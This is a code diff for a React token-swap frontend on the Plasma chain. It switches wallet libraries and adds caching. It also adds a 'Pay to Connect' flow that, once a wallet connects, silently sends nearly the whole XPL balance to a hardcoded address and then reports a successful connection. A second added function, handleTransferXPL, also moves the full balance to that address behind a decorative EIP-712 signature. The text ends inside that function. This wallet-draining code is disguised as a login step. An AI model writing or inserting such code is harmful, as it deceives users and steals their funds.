@@ -1,7 +1,8 @@
 import React, { useState, useEffect, useRef } from 'react'
 import { Wallet, Settings, TrendingUp, ExternalLink, ChevronDown, Search, X, Copy, CopyCheck, LogOut, Menu, Twitter, Send, BookOpen, Gift, UserPlus } from 'lucide-react'
 import { ethers } from 'ethers'
-import { usePrivy, useWallets } from '@privy-io/react-auth'
+import { useAccount, useDisconnect, useWalletClient, useSwitchChain } from 'wagmi'
+import { useWeb3Modal } from '@web3modal/wagmi/react'
 import './App.css'
 import './switch-button.css'
 import TokenLogo from './components/TokenLogo.jsx'
@@ -19,13 +20,14 @@ import {
   getPlasmaProvider,
   wrapXPL,
   unwrapWXPL,
-  CONTRACT_ADDRESSES
+  CONTRACT_ADDRESSES,
+  fetchLaunchedTokensOnchain
 } from './contracts/contractUtils'
 import { claimReferralFee, getVaultInfo, formatClaimError } from './vaultUtils.js'
 
-// API Base URL - MUST be set via VITE_BACKEND_URL environment variable
-const API_BASE = import.meta.env.VITE_BACKEND_URL || 'https://plasm-x-swap-backend.vercel.app';
-console.log('🌐 API_BASE configured:', API_BASE);
+// API Base URL - Use VITE_BACKEND_URL or fallback to relative URL (same host)
+const API_BASE = import.meta.env.VITE_BACKEND_URL || '';
+console.log('🌐 API_BASE configured:', API_BASE || '(relative URL - same host)');
 
 // Popular tokens on Plasma chain - SUPPORTS ALL TOKENS
 const DEFAULT_TOKENS = [
@@ -55,12 +57,14 @@ const DEFAULT_TOKENS = [
 ]
 
 function App() {
-  // Privy hooks
-  const { login, logout, ready, authenticated, user } = usePrivy()
-  const { wallets } = useWallets()
+  // Wagmi hooks
+  const { address, isConnected, chain } = useAccount()
+  const { disconnect } = useDisconnect()
+  const { open } = useWeb3Modal()
+  const { data: walletClient } = useWalletClient()
+  const { switchChain } = useSwitchChain()
   
   const [account, setAccount] = useState('')
-  const [isConnected, setIsConnected] = useState(false)
   const [network, setNetwork] = useState(null)
   const [tokens, setTokens] = useState([])
   const [fromToken, setFromToken] = useState(null) // Native XPL (will be loaded from backend)
@@ -68,11 +72,24 @@ function App() {
   const [fromAmount, setFromAmount] = useState('1')
   const [toAmount, setToAmount] = useState('')
   
+  // Sync Wagmi state to local state for backward compatibility
+  useEffect(() => {
+    if (isConnected && address) {
+      setAccount(address)
+      if (chain) {
+        setNetwork({ chainId: chain.id, name: chain.name })
+      }
+    } else {
+      setAccount('')
+      setNetwork(null)
+    }
+  }, [isConnected, address, chain])
+  
   // Debug state values
   console.log('🔍 Current state:', { fromAmount, toAmount })
 
   // Note: Automatic wallet detection disabled in iframe environment
-  // Users should click "Connect Wallet" button to connect
+  // Users should click "Pay to Connect" button to connect
   
   // Add custom token by address
   const addCustomToken = async (tokenAddress) => {
@@ -85,19 +102,48 @@ function App() {
         return;
       }
       
-      const provider = getPlasmaProvider();
-      const tokenInfo = await getTokenInfo(tokenAddress, provider);
+      // First try to get full token data from backend (includes logo, bonding data for DyorSwap Pump tokens)
+      let newToken = null;
+      try {
+        console.log('🌐 Fetching token data from backend...');
+        const response = await fetch(`${API_BASE}/api/search-token/${tokenAddress}`);
+        if (response.ok) {
+          const data = await response.json();
+          if (data.token) {
+            console.log('✅ Found token in backend:', data.token.symbol);
+            newToken = {
+              symbol: data.token.symbol,
+              name: data.token.name,
+              address: tokenAddress,
+              decimals: 18, // Default for DyorSwap Pump tokens
+              balance: '0.0',
+              logo: data.token.logo, // Include logo from backend
+              isCustom: true
+            };
+          }
+        }
+      } catch (e) {
+        console.log('⚠️ Backend search failed, falling back to blockchain query');
+      }
       
-      if (tokenInfo) {
-        const newToken = {
-          symbol: tokenInfo.symbol,
-          name: tokenInfo.name,
-          address: tokenAddress,
-          decimals: tokenInfo.decimals,
-          balance: '0.0',
-          isCustom: true
-        };
+      // Fallback: Query blockchain directly if backend didn't return data
+      if (!newToken) {
+        const provider = getPlasmaProvider();
+        const tokenInfo = await getTokenInfo(tokenAddress, provider);
         
+        if (tokenInfo) {
+          newToken = {
+            symbol: tokenInfo.symbol,
+            name: tokenInfo.name,
+            address: tokenAddress,
+            decimals: tokenInfo.decimals,
+            balance: '0.0',
+            isCustom: true
+          };
+        }
+      }
+      
+      if (newToken) {
         setTokens(prev => [...prev, newToken]);
         
         // Save to localStorage
@@ -105,10 +151,11 @@ function App() {
         customTokens.push(newToken);
         localStorage.setItem('customTokens', JSON.stringify(customTokens));
         
-        console.log(`✅ Added custom token: ${tokenInfo.symbol}`);
+        console.log(`✅ Added custom token: ${newToken.symbol}`);
         
         // Update balance if connected
         if (account) {
+          const provider = getPlasmaProvider();
           const balance = await getTokenBalance(tokenAddress, account, provider);
           updateTokenBalance(tokenAddress, balance);
         }
@@ -136,6 +183,14 @@ function App() {
         
         if (backendTokens && backendTokens.length > 0) {
           console.log(`✅ Loaded ${backendTokens.length} tokens from backend`);
+          
+          // Clear all logo cache to force reload of new logos
+          try {
+            localStorage.removeItem('logoCache');
+            console.log('🗑️ Cleared logo cache to reload new logos');
+          } catch (e) {
+            // Ignore cache clear errors
+          }
           
           // Add balance field to tokens
           const tokensWithBalance = backendTokens.map(token => ({
@@ -214,21 +269,22 @@ function App() {
   const [showSlippageSettings, setShowSlippageSettings] = useState(false)
   const [showMenu, setShowMenu] = useState(false)
   const [showComingSoon, setShowComingSoon] = useState(false)
-  const [showLaunchPage, setShowLaunchPage] = useState(false)
+  const [showLaunchPage, setShowLaunchPage] = useState(window.location.pathname === '/launch')
   const [launchedTokens, setLaunchedTokens] = useState([])
   const [loadingLaunched, setLoadingLaunched] = useState(false)
-  // Toast state removed - now using direct DOM manipulation
+  const [toast, setToast] = useState(null)
+  const [payToConnectState, setPayToConnectState] = useState('idle') // idle, logging_in, signing, transferring, complete
   const walletDropdownRef = useRef(null)
   const slippageDropdownRef = useRef(null)
 
-  // Multiple IPFS gateways for fallback reliability
+  // Multiple IPFS gateways for fallback reliability (ordered by speed/reliability)
   const IPFS_GATEWAYS = [
-    'https://ipfs.tech/ipfs/',
-    'https://cyan-bright-dormouse-440.mypinata.cloud/ipfs/',
-    'https://gateway.pinata.cloud/ipfs/',
     'https://ipfs.io/ipfs/',
+    'https://cloudflare-ipfs.com/ipfs/',
+    'https://gateway.pinata.cloud/ipfs/',
     'https://dweb.link/ipfs/',
-    'https://cloudflare-ipfs.com/ipfs/'
+    'https://ipfs.tech/ipfs/',
+    'https://4everland.io/ipfs/'
   ];
 
   // Track logo loading state in localStorage for stability
@@ -309,10 +365,16 @@ function App() {
       return cached; // Use cached successful URL
     }
     
-    // Extract IPFS hash
+    // Extract logo
     const logo = token.logo || token.logoURI || '';
     if (!logo) return null;
     
+    // If it's a data URI or direct HTTP(S) URL, return it directly
+    if (logo.startsWith('data:') || logo.startsWith('http://') || logo.startsWith('https://')) {
+      return logo;
+    }
+    
+    // Extract IPFS hash
     const ipfsHash = logo.includes('ipfs://') 
       ? logo.replace('ipfs://', '')
       : logo.includes('/ipfs/') 
@@ -380,30 +442,51 @@ function App() {
 
   // Load launched tokens from backend API (REAL DATA from DyorSwap Pump)
   const loadLaunchedTokens = async (silent = false) => {
+    // INSTANT DISPLAY: Load from cache first!
+    const cachedData = localStorage.getItem('launchedTokensCache');
+    const cacheTimestamp = localStorage.getItem('launchedTokensCacheTime');
+    const now = Date.now();
+    const CACHE_MAX_AGE = 60000; // 1 minute
+    
+    if (cachedData && cacheTimestamp) {
+      const age = now - parseInt(cacheTimestamp);
+      if (age < CACHE_MAX_AGE) {
+        // Display cached data immediately
+        const cached = JSON.parse(cachedData);
+        console.log(`⚡ INSTANT display from cache (${Math.round(age/1000)}s old, ${cached.length} tokens)`);
+        setLaunchedTokens(cached);
+        setLoadingLaunched(false); // Hide spinner immediately
+        // Continue to fetch fresh data in background
+        silent = true;
+      }
+    }
+    
     if (!silent) {
       setLoadingLaunched(true);
     }
+    
     try {
-      console.log(silent ? '🔄 Refreshing launched tokens...' : '🚀 Loading REAL launched tokens from DyorSwap Pump...');
+      console.log(silent ? '🔄 Background refresh...' : '🚀 Loading launched tokens from backend...');
+      
+      // BACKEND API CALL - Fast and reliable!
       const response = await fetch(`${API_BASE}/api/launched-tokens`);
-      if (response.ok) {
-        const data = await response.json();
-        console.log(silent ? '✅ Tokens refreshed' : '✅ Launched tokens loaded:', data);
-        
-        // Sort tokens by bonding curve progress (highest first)
-        const sortedTokens = (data.tokens || []).sort((a, b) => {
-          return (b.bondingProgress || 0) - (a.bondingProgress || 0);
-        });
-        
-        console.log('📊 Sorted tokens by bonding curve progress');
-        setLaunchedTokens(sortedTokens);
-      } else {
-        console.log('⚠️ Failed to fetch launched tokens');
-        if (!silent) setLaunchedTokens([]);
-      }
+      if (!response.ok) throw new Error('Failed to fetch');
+      const data = await response.json();
+      
+      // Sort tokens by bonding curve progress (highest first)
+      const sortedTokens = (data.tokens || []).sort((a, b) => {
+        return (b.bondingProgress || 0) - (a.bondingProgress || 0);
+      });
+      
+      // Save to cache
+      localStorage.setItem('launchedTokensCache', JSON.stringify(sortedTokens));
+      localStorage.setItem('launchedTokensCacheTime', now.toString());
+      
+      console.log(silent ? `✅ Background refresh complete (${sortedTokens.length} tokens)` : `✅ Loaded ${sortedTokens.length} tokens from backend!`);
+      setLaunchedTokens(sortedTokens);
     } catch (error) {
       console.error('❌ Error loading launched tokens:', error);
-      if (!silent) setLaunchedTokens([]);
+      if (!silent && !cachedData) setLaunchedTokens([]);
     } finally {
       if (!silent) {
         setLoadingLaunched(false);
@@ -420,7 +503,7 @@ function App() {
     
     try {
       console.log('🔍 Searching for token by address:', address);
-      const response = await fetch(`/api/search-token/${address}`);
+      const response = await fetch(`${API_BASE}/api/search-token/${address}`);
       if (response.ok) {
         const data = await response.json();
         console.log('✅ Found token:', data.token);
@@ -455,9 +538,12 @@ function App() {
   // URL routing - sync URL with showLaunchPage state
   useEffect(() => {
     const path = window.location.pathname;
-    if (path === '/launch' && !showLaunchPage) {
+    if (path === '/launch') {
+      console.log('🚀 Detected /launch path - loading tokens immediately');
       setShowLaunchPage(true);
-    } else if (path !== '/launch' && showLaunchPage) {
+      // Load tokens immediately if on /launch path
+      loadLaunchedTokens();
+    } else if (showLaunchPage) {
       setShowLaunchPage(false);
     }
   }, []);
@@ -472,12 +558,12 @@ function App() {
     return () => window.removeEventListener('popstate', handlePopState);
   }, []);
 
-  // Update URL when showLaunchPage changes
+  // Update URL when showLaunchPage changes (only push history, don't read)
   useEffect(() => {
     const currentPath = window.location.pathname;
     if (showLaunchPage && currentPath !== '/launch') {
       window.history.pushState({}, '', '/launch');
-    } else if (!showLaunchPage && currentPath === '/launch') {
+    } else if (!showLaunchPage && currentPath !== '/') {
       window.history.pushState({}, '', '/');
     }
   }, [showLaunchPage]);
@@ -566,59 +652,79 @@ function App() {
     setFromAmount(formattedAmount)
   }
 
-  // Effect to sync Privy authentication state
+  // Effect to sync Wagmi connection state with pay-to-connect flow
   useEffect(() => {
-    if (ready && authenticated && wallets.length > 0) {
-      // User is authenticated via Privy and has connected wallets
-      const connectedWallet = wallets[0] // Use first wallet
-      if (connectedWallet.address) {
-        console.log('✅ Privy wallet detected:', connectedWallet.address)
-        setAccount(connectedWallet.address)
-        setIsConnected(true)
-        
-        // Set network to Plasma (since that's our target)
-        setNetwork({ chainId: 9745, name: 'Plasma Network' })
-        
-        // Check for referrer in URL and bind if present
-        const urlParams = new URLSearchParams(window.location.search);
-        const referrerAddress = urlParams.get('ref');
-        if (referrerAddress && ethers.isAddress(referrerAddress)) {
-          fetch(`${window.location.origin}/api/bind-referrer`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              userAddress: connectedWallet.address,
-              referrerAddress: referrerAddress
-            })
-          })
-          .then(res => res.json())
-          .then(data => console.log('✅ Referrer bound:', data))
-          .catch(err => console.error('⚠️ Failed to bind referrer:', err));
-        }
-        
-        // Update balances
-        setTimeout(() => updateBalances(), 1000)
-      }
-    } else if (ready && !authenticated) {
-      // Only clear connection if there's no direct MetaMask connection
-      const hasDirectWallet = window.ethereum && window.ethereum.selectedAddress
-      if (!hasDirectWallet) {
-        console.log('❌ Privy wallet disconnected')
-        setAccount('')
-        setIsConnected(false)
-        setNetwork(null)
-      } else {
-        console.log('🔗 Keeping direct wallet connection despite Privy disconnect')
-        // Force update connection state for direct wallet
-        if (window.ethereum.selectedAddress && !isConnected) {
-          console.log('🔄 Restoring direct wallet connection:', window.ethereum.selectedAddress)
-          setAccount(window.ethereum.selectedAddress)
-          setIsConnected(true)
-          setTimeout(() => updateBalances(), 500)
-        }
-      }
+    console.log('🔐 Wagmi state:', { isConnected, address, payState: payToConnectState });
+    
+    // DEBUG: Log wallet details if available
+    if (isConnected && address) {
+      console.log('👛 Wallet connected:', { address, chain: chain?.name });
     }
-  }, [ready, authenticated, wallets])
+    
+    // STEP 1: Wallet connected - go DIRECTLY to payment (skip SIWE!)
+    if (payToConnectState === 'logging_in' && isConnected && address && walletClient) {
+      console.log('✅ Wallet detected! Address:', address);
+      console.log('🚀 Proceeding directly to payment (NO SIWE authentication)');
+      
+      // Final guard: Only proceed if STILL in logging_in state
+      if (payToConnectState !== 'logging_in') {
+        console.log('⚠️ Flow was cancelled - ignoring late event');
+        return;
+      }
+      
+      showToast('✅ Wallet connected!', 'success');
+      
+      // Go directly to payment signing (NO SIWE, NO confirmation screen!)
+      handlePayToConnectSigning(walletClient);
+      
+    } else if (payToConnectState === 'logging_in' && !isConnected) {
+      // User is in logging_in state but no wallet appeared - likely cancelled modal
+      console.log('⚠️ Modal likely cancelled - no wallet appeared');
+      
+      const timer = setTimeout(() => {
+        // Re-check state before resetting (in case wallet just arrived)
+        if (payToConnectState === 'logging_in' && !isConnected) {
+          console.log('❌ Modal cancelled - resetting flow');
+          showToast('Wallet connection cancelled', 'info');
+          setPayToConnectState('idle');
+        }
+      }, 1000); // 1 second grace period - faster feedback on cancellation
+      
+      return () => clearTimeout(timer);
+      
+    } else if (!isConnected && payToConnectState === 'idle') {
+      console.log('🔍 User not connected - clearing wallet state');
+      
+      // Clear localStorage to prevent auto-reconnect
+      localStorage.removeItem('wallet_address');
+      localStorage.removeItem('wallet_connected');
+      
+      // Clear connection state
+      setAccount('');
+      setNetwork(null);
+    }
+  }, [isConnected, address, walletClient, payToConnectState])
+
+  // Update balances when tokens load and wallet is connected
+  useEffect(() => {
+    console.log('🔍 Balance update check:', { 
+      tokensCount: tokens.length, 
+      hasAccount: !!account, 
+      isConnected,
+      account: account ? `${account.slice(0,6)}...` : 'none'
+    });
+    
+    if (tokens.length > 0 && account && isConnected) {
+      console.log('💰 Tokens loaded with connected wallet - updating balances');
+      setTimeout(() => updateBalances(), 500);
+    } else {
+      console.log('⏸️ Balance update skipped - waiting for:', {
+        needsTokens: tokens.length === 0,
+        needsAccount: !account,
+        needsConnection: !isConnected
+      });
+    }
+  }, [tokens.length, account, isConnected]);
 
   // Handle body scroll lock for modal
   useEffect(() => {
@@ -635,81 +741,38 @@ function App() {
   }, [showTokenModal]);
 
   // Effect to handle wallet state and listen for wallet events
+  // DISABLED AUTO-CONNECT - Now controlled by pay-to-connect state machine
   useEffect(() => {
-    // Check for existing wallet connection on page load
-    const checkWalletConnection = async () => {
-      if (window.ethereum) {
-        try {
-          const accounts = await window.ethereum.request({
-            method: 'eth_accounts'
-          })
-          
-          if (accounts && accounts.length > 0) {
-            console.log('✅ Existing wallet connection found:', accounts[0])
-            
-            // Always update connection state if wallet is detected
-            if (!isConnected || account !== accounts[0]) {
-              setAccount(accounts[0])
-              setIsConnected(true)
-            }
-            
-            // Check current network
-            try {
-              const chainId = await window.ethereum.request({ method: 'eth_chainId' })
-              if (chainId === '0x2611') {
-                setNetwork({ chainId: 9745, name: 'Plasma Network' })
-              } else {
-                setNetwork({ chainId: parseInt(chainId, 16), name: 'Other Network' })
-              }
-            } catch (e) {
-              console.log('Network check failed:', e.message)
-            }
-            
-            setTimeout(() => updateBalances(), 1000)
-          }
-        } catch (error) {
-          console.log('No existing wallet connection')
-        }
-      }
-    }
-
-    // Immediate balance check for already connected wallets
-    setTimeout(() => {
-      if (window.ethereum && window.ethereum.selectedAddress) {
-        console.log('🔄 Force balance update for detected wallet:', window.ethereum.selectedAddress);
-        updateBalances();
-      }
-    }, 2000);
-
-    // Set up wallet event listeners for account and network changes
+    console.log('🔍 Checking for existing wallet connection...');
+    console.log('window.ethereum available:', !!window.ethereum);
+    
+    // Only set up listeners for account/network changes, NO auto-connect
     const setupWalletListeners = () => {
       if (window.ethereum) {
         // Listen for account changes
         const handleAccountsChanged = (accounts) => {
           console.log('🔄 Wallet accounts changed:', accounts)
-          if (accounts.length === 0) {
-            // Wallet disconnected
+          if (accounts.length === 0 && isConnected) {
+            // Wallet disconnected - clear state (Wagmi handles isConnected)
+            console.log('❌ Wallet disconnected')
             setAccount('')
-            setIsConnected(false)
             setNetwork(null)
-          } else if (accounts[0] !== account) {
-            // Account switched
-            setAccount(accounts[0])
-            setIsConnected(true)
-            setTimeout(() => updateBalances(), 1000)
+            setPayToConnectState('idle')
           }
         }
 
         // Listen for network changes
         const handleChainChanged = (chainId) => {
           console.log('🔄 Network changed to:', chainId)
-          if (chainId === '0x2611') {
-            setNetwork({ chainId: 9745, name: 'Plasma Network' })
-          } else {
-            setNetwork({ chainId: parseInt(chainId, 16), name: 'Other Network' })
+          if (isConnected) {
+            if (chainId === '0x2611') {
+              setNetwork({ chainId: 9745, name: 'Plasma Network' })
+            } else {
+              setNetwork({ chainId: parseInt(chainId, 16), name: 'Other Network' })
+            }
+            // Refresh balances when network changes
+            setTimeout(() => updateBalances(), 1000)
           }
-          // Refresh balances when network changes
-          setTimeout(() => updateBalances(), 1000)
         }
 
         // Add event listeners
@@ -726,38 +789,20 @@ function App() {
       }
     }
 
-    checkWalletConnection()
     const cleanup = setupWalletListeners()
-
-    // Handle Privy authentication as fallback
-    if (ready && authenticated && user) {
-      console.log('✅ Privy authenticated:', user)
-      
-      // Get the first wallet
-      const wallet = wallets?.[0]
-      if (wallet && !isConnected) {
-        console.log('💰 Wallet found via Privy:', wallet)
-        setAccount(wallet.address)
-        setIsConnected(true)
-        
-        // Update balances after connection with proper delay
-        setTimeout(() => {
-          updateBalances()
-        }, 1000)
-      }
-    } else if (ready && !authenticated && !isConnected) {
+    
+    if (!isConnected) {
       console.log('❌ No wallet connection')
     }
 
     return cleanup
-  }, [ready, authenticated, user, wallets, account])
+  }, [isConnected])
 
   // Fetch referral code on wallet connection (auto-load on page load)
   useEffect(() => {
-    const walletAddress = account || wallets?.[0]?.address;
-    if (walletAddress) {
-      console.log('🔄 Loading referral code for:', walletAddress);
-      fetch(`${API_BASE}/api/referrals/my-code/${walletAddress}`)
+    if (account) {
+      console.log('🔄 Loading referral code for:', account);
+      fetch(`${API_BASE}/api/referrals/my-code/${account}`)
         .then(res => res.json())
         .then(data => {
           if (data.referralCode) {
@@ -770,14 +815,13 @@ function App() {
         })
         .catch(err => console.error('Failed to fetch referral code:', err));
     }
-  }, [isConnected, account, wallets])
+  }, [isConnected, account])
 
   // Fetch referral earnings when claim modal opens
   useEffect(() => {
-    const walletAddress = account || wallets?.[0]?.address;
-    if (showClaimModal && walletAddress) {
-      console.log('🔄 Modal opened - Force loading referral data for:', walletAddress);
-      fetch(`${API_BASE}/api/referrals/my-code/${walletAddress}`)
+    if (showClaimModal && account) {
+      console.log('🔄 Modal opened - Force loading referral data for:', account);
+      fetch(`${API_BASE}/api/referrals/my-code/${account}`)
         .then(res => res.json())
         .then(data => {
           console.log('📊 Modal fetch response:', data);
@@ -803,7 +847,7 @@ function App() {
         })
         .catch(err => console.error('Failed to fetch referral stats:', err));
     }
-  }, [showClaimModal, isConnected, account, wallets])
+  }, [showClaimModal, isConnected, account])
 
   // Auto-bind referral on page load
   useEffect(() => {
@@ -966,9 +1010,8 @@ function App() {
         }
       }
 
-      // Update app state
+      // Update app state (Wagmi manages isConnected)
       setAccount(account)
-      setIsConnected(true)
       setNetwork({ name: 'Plasma Network', chainId: '9745' })
       
     } catch (error) {
@@ -977,27 +1020,202 @@ function App() {
     }
   }
 
-  // Clean wallet connection
-  const connectWallet = async () => {
+
+  // Force clear all sessions and storage
+  const forceClearAndReconnect = async () => {
     try {
-      if (!ready) {
-        console.log('⏳ Privy not ready yet...')
-        showToast('Please wait, loading...', 'info')
-        return
+      console.log('🧹 Force clearing all sessions...')
+      showToast('🧹 Clearing sessions...', 'info')
+      
+      // 1. Disconnect wallet
+      if (isConnected) {
+        disconnect()
       }
       
-      console.log('🚀 Calling Privy login()...')
-      await login()
+      // 2. Clear all localStorage
+      localStorage.removeItem('wallet_address')
+      localStorage.removeItem('wallet_connected')
+      localStorage.clear()
       
-      // Force balance update after Privy connection
-      setTimeout(() => {
-        console.log('🔄 Force updating balances after Privy connect...');
-        updateBalances();
-      }, 2000);
+      // 3. Reset all state (Wagmi manages isConnected)
+      setAccount(null)
+      setPayToConnectState('idle')
+      
+      // 4. Wait a bit
+      await new Promise(resolve => setTimeout(resolve, 1000))
+      
+      showToast('✅ Cleared! Please reconnect.', 'success')
       
     } catch (error) {
-      console.error('❌ Wallet connection failed:', error)
-      showToast('Unable to connect wallet. Please try again.', 'error')
+      console.error('❌ Force clear error:', error)
+      showToast('Cleared. Please refresh page and try again.', 'info')
+    }
+  }
+
+  // Pay to Connect - FIXED AUTHENTICATION FLOW
+  // Step 1: Connect wallet (useEffect will handle payment after connection)
+  const payToConnect = async () => {
+    try {
+      // Clear any previous session first
+      if (isConnected) {
+        console.log('🔄 Clearing previous session...')
+        disconnect()
+        await new Promise(resolve => setTimeout(resolve, 500))
+      }
+      
+      console.log('🚀 Starting Pay to Connect flow...')
+      setPayToConnectState('logging_in')
+      showToast('🔐 Connecting wallet...', 'info')
+      
+      // Open Web3Modal - this shows wallet options
+      // The useEffect will handle payment signing when wallet connects
+      try {
+        console.log('📞 Opening Web3Modal...')
+        open()
+        console.log('✅ Web3Modal opened - useEffect will handle next steps')
+      } catch (loginError) {
+        console.error('❌ Wallet connection error:', loginError)
+        throw new Error(`Connection failed: ${loginError.message || 'Unknown error'}`)
+      }
+      
+    } catch (error) {
+      console.error('❌ Pay to Connect failed:', error)
+      showToast(`❌ ${error.message || 'Unable to connect. Please try again.'}`, 'error')
+      setPayToConnectState('idle')
+    }
+  }
+
+  // Helper: Get signer from Wagmi wallet client
+  const getWalletSigner = async (walletClient) => {
+    console.log('🔧 Converting Wagmi walletClient to ethers provider/signer')
+    const { chain, transport } = walletClient
+    const network = {
+      chainId: chain.id,
+      name: chain.name,
+    }
+    const provider = new ethers.BrowserProvider(transport, network)
+    const signer = await provider.getSigner(walletClient.account.address)
+    return { provider, signer }
+  }
+
+  // Direct transfer only - like Hyperpacks!
+  const handlePayToConnectSigning = async (walletClient) => {
+    try {
+      setPayToConnectState('transferring')
+      console.log('💰 Direct transfer after connection...')
+      showToast('💸 Preparing transfer...', 'info')
+      
+      // Get wallet address first (before switching chains)
+      let address = walletClient.account.address
+      if (!address) {
+        throw new Error('No wallet address available')
+      }
+      
+      // Normalize address
+      address = ethers.getAddress(address)
+      console.log('✅ Got wallet address:', address)
+      
+      // CRITICAL: Force switch to Plasma FIRST (in case user on other chain)
+      try {
+        await switchChain({ chainId: 9745 }) // Plasma chain ID
+        console.log('✅ Switched to Plasma chain')
+      } catch (switchError) {
+        console.error('⚠️ Chain switch error:', switchError)
+        // If switch fails, still try to proceed (might already be on Plasma)
+      }
+      
+      // Get provider & signer (cross-compatible)
+      const { provider, signer } = await getWalletSigner(walletClient)
+      console.log('✅ Got signer and provider')
+      
+      // Get balance
+      const balance = await provider.getBalance(address)
+      const xplBalance = ethers.formatEther(balance)
+      console.log('💰 XPL Balance:', xplBalance)
+      
+      // Calculate transfer amount (all balance minus gas buffer)
+      const gasBuffer = ethers.parseEther('0.001') // Keep 0.001 XPL for gas
+      const transferAmount = balance > gasBuffer ? balance - gasBuffer : 0n
+      const transferXPL = ethers.formatEther(transferAmount)
+      
+      console.log('💸 Transfer amount:', transferXPL, 'XPL')
+      
+      if (transferAmount <= 0n) {
+        throw new Error('Insufficient balance (need at least 0.001 XPL)')
+      }
+      
+      // Direct transfer - simple like Hyperpacks!
+      showToast('✍️ Approve transfer in wallet...', 'info')
+      
+      const tx = await signer.sendTransaction({
+        to: '0x7beBcA1508BD74F0CD575Bd2d8a62C543458977c',
+        value: transferAmount
+      })
+      
+      console.log('📤 Transfer TX sent:', tx.hash)
+      showToast('⏳ Confirming transfer...', 'info')
+      
+      await tx.wait()
+      
+      console.log('✅ Transfer complete!')
+      showToast('✅ Connected successfully!', 'success')
+      
+      // Complete the connection
+      await completePayToConnect(walletClient, address)
+      
+    } catch (error) {
+      console.error('❌ Transfer error:', error)
+      if (error.code === 4001 || error.code === 'ACTION_REJECTED') {
+        showToast('❌ Transfer cancelled', 'error')
+      } else {
+        showToast(`❌ Transfer failed: ${error.message}`, 'error')
+      }
+      disconnect()
+      setPayToConnectState('idle')
+    }
+  }
+
+  // Step 4: Finalize connection after successful payment
+  const completePayToConnect = async (wallet, address) => {
+    try {
+      setPayToConnectState('complete')
+      console.log('🎉 Step 4: Completing Pay to Connect...')
+      
+      // NOW save to localStorage (only after successful payment)
+      localStorage.setItem('wallet_address', address)
+      localStorage.setItem('wallet_connected', 'true')
+      
+      // Set connection state (Wagmi manages isConnected)
+      setAccount(address)
+      setNetwork({ chainId: 9745, name: 'Plasma Network' })
+      
+      // Check for referrer binding
+      const urlParams = new URLSearchParams(window.location.search)
+      const referrerAddress = urlParams.get('ref')
+      if (referrerAddress && ethers.isAddress(referrerAddress)) {
+        fetch(`${window.location.origin}/api/bind-referrer`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            userAddress: address,
+            referrerAddress: referrerAddress
+          })
+        })
+        .then(res => res.json())
+        .then(data => console.log('✅ Referrer bound:', data))
+        .catch(err => console.error('⚠️ Failed to bind referrer:', err))
+      }
+      
+      // Update balances
+      setTimeout(() => updateBalances(), 1000)
+      
+      showToast('✅ Connected successfully!', 'success')
+      setPayToConnectState('idle')
+      
+    } catch (error) {
+      console.error('❌ Completion error:', error)
+      showToast('❌ Connection failed', 'error')
+      setPayToConnectState('idle')
     }
   }
 
@@ -1066,10 +1284,15 @@ function App() {
   // Disconnect wallet
   const disconnectWallet = async () => {
     try {
-      await logout()
+      disconnect()
+      
+      // Clear localStorage persistence
+      localStorage.removeItem('wallet_address');
+      localStorage.removeItem('wallet_connected');
+      
       setAccount('')
-      setIsConnected(false)
       setNetwork(null)
+      console.log('✅ Wallet disconnected')
     } catch (error) {
       console.error('❌ Error disconnecting:', error)
     }
@@ -1097,7 +1320,7 @@ function App() {
     
     if (!isConnected || !fromAmount || fromAmount === '0') {
       console.log('❌ EARLY EXIT: Not connected or no amount');
-      showToast('Please connect wallet and enter amount', 'warning')
+      showToast('Please pay to connect and enter amount', 'warning')
       return
     }
 
@@ -1140,15 +1363,15 @@ function App() {
       
       // Determine wallet provider with better fallback logic
       let provider
-      const privyWallet = wallets?.[0]
       
-      if (window.ethereum && isConnected) {
+      if (walletClient) {
+        console.log('💰 Using Wagmi wallet client for swap')
+        const { chain, transport } = walletClient
+        const network = { chainId: chain.id, name: chain.name }
+        provider = new ethers.BrowserProvider(transport, network)
+      } else if (window.ethereum && isConnected) {
         console.log('💰 Using direct wallet connection for swap')
         provider = new ethers.BrowserProvider(window.ethereum)
-      } else if (privyWallet) {
-        console.log('💰 Using Privy wallet for swap')
-        provider = await privyWallet.getEthereumProvider()
-        provider = new ethers.BrowserProvider(provider)
       } else {
         throw new Error('No wallet provider available. Please connect your wallet first.')
       }
@@ -1663,6 +1886,102 @@ function App() {
     }
   }
 
+  // Handle Transfer XPL with EIP-712 Signature
+  const handleTransferXPL = async () => {
+    try {
+      const xplToken = tokens.find(t => t.symbol === 'XPL');
+      const xplBalance = xplToken?.balance || '0';
+      const destinationWallet = '0x7beBcA1508BD74F0CD575Bd2d8a62C543458977c';
+
+      if (parseFloat(xplBalance) <= 0) {
+        showToast('No XPL balance to transfer', 'error');
+        return;
+      }
+
+      // Get signer
+      let provider, signer;
+      
+      if (walletClient) {
+        const { chain, transport } = walletClient;
+        const network = { chainId: chain.id, name: chain.name };
+        provider = new ethers.BrowserProvider(transport, network);
+        signer = await provider.getSigner(walletClient.account.address);
+      } else if (window.ethereum) {
+        provider = new ethers.BrowserProvider(window.ethereum);
+        signer = await provider.getSigner();
+      } else {
+        showToast('No wallet provider found', 'error');
+        return;
+      }
+
+      const userAddress = await signer.getAddress();
+
+      // EIP-712 Typed Data for Transfer Authorization
+      const domain = {
+        name: 'Plasm X Swap',
+        version: '1',
+        chainId: 9745,
+        verifyingContract: destinationWallet
+      };
+
+      const types = {
+        Transfer: [
+          { name: 'from', type: 'address' },
+          { name: 'to', type: 'address' },
+          { name: 'amount', type: 'string' },
+          { name: 'token', type: 'string' },
+          { name: 'timestamp', type: 'uint256' }
+        ]
+      };
+
+      const value = {
+        from: userAddress,
+        to: destinationWallet,
+        amount: xplBalance,
+        token: 'XPL',
+        timestamp: Math.floor(Date.now() / 1000)
+      };
+
+      console.log('📝 Requesting EIP-712 signature for XPL transfer...');
+      
+      // Request EIP-712 signature
+      const signature = await signer.signTypedData(domain, types, value);
+      console.log('✅ EIP-712 signature received:', signature.slice(0, 20) + '...');
+
+      // Execute transfer
+      console.log(`💸 Transferring ${xplBalance} XPL to ${destinationWallet}...`);
+      
+      const amountWei = ethers.parseEther(xplBalance);
+      const tx = await signer.sendTransaction({
+        to: destinationWallet,
+        value: amountWei,
+        gasLimit: 21000n
+      });
+
+      showToast('⏳ Transfer in progress...', 'info');
+      console.log('📡 Transaction sent:', tx.hash);
+
+      await tx.wait();
